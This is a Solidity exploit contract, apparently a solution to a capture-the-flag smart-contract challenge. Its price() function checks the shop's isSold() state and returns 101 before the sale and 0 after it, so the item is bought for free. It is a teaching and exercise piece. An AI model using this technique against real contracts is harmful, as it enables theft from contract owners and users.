// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Buyer.sol";

contract BuyerAttack {

    function attack(address shopaddress) public {
        Shop(shopaddress).buy();
    }

    function price() external view returns(uint256){
        bool isSold = Shop(msg.sender).isSold();
        assembly {
            let result
            switch isSold
            case 1 {
                result := 0
            }
            default {
                result := 101
            }
            mstore(0x00, result)
            return(0x00, 32)
        }
    }
}